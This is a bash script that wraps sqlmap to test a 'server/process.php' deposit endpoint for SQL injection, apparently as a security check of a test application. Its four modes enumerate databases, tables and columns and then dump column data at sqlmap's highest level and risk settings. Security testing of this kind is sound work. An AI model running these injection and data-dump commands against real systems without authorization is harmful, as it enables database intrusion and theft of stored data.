#!/bin/bash

URL="server/process.php?user=abc&pass=abc&drop=deposit&amount=10"

if [[ ( $# -eq 0 ) || ( $1 == "--help" ) ]]
then
    echo "USAGES:"
    echo "  > ./sqlmap_check.sh --discovery                                                   -> list information about existing databases on the target server"
    echo "  > ./sqlmap_check.sh --database <dbName>                                           -> list information about tables present in <dbName> database"
    echo "  > ./sqlmap_check.sh --database <dbName> --table <tableName>                       -> list information about the colums of <tableName> table"
    echo "  > ./sqlmap_check.sh --database <dbName> --table <tableName> --column <columnName> -> dump data of <columnName> column"
    exit
fi

# Initial discovery
if [[ ( $# -ge 1 ) && ( $1 == "--discovery" ) ]]
then 
    echo "--- Starting sqlmap for initial discovery ---"
    sqlmap --level=5 --risk=3 --dbs -u $URL
    echo "--- sqlmap discovery terminated ---"
    exit
fi

# Get information about a particular database
if [[ ( $# -eq 2 ) && ( $1 == "--database" ) ]]
then    
    echo "--- Starting sqlmap to retrieve information about database '$2' ---"
    sqlmap --level=5 --risk=3 -u $URL -D $2 --tables
    echo "--- sqlmap execution terminated ---"
    exit
fi

# Get information about a table in a particular database
if [[ ( $# -eq 4 ) && ( $1 == "--database" ) && ( $3 == "--table" ) ]]
then 
    echo "--- Starting sqlmap to retrieve information about table '$4' in database '$2' ---"
    sqlmap --level=5 --risk=3 -u $URL -D $2 -T $4 --columns
    echo "--- sqlmap execution terminated ---"
    exit
fi

# Retrieve data of a specific column given table and database names
if [[ ( $# -eq 6 ) && ( $1 == "--database" ) && ( $3 == "--table" ) && ( $5 == '--column' ) ]]
then
    echo "--- Starting sqlmap to dump data of column '$6' of table '$4' in database '$2' ---"
    sqlmap --level=5 --risk=3 -u $URL -D $2 -T $4 -C $6 --dump
    echo "--- sqlmap execution terminated ---"
    exit
fi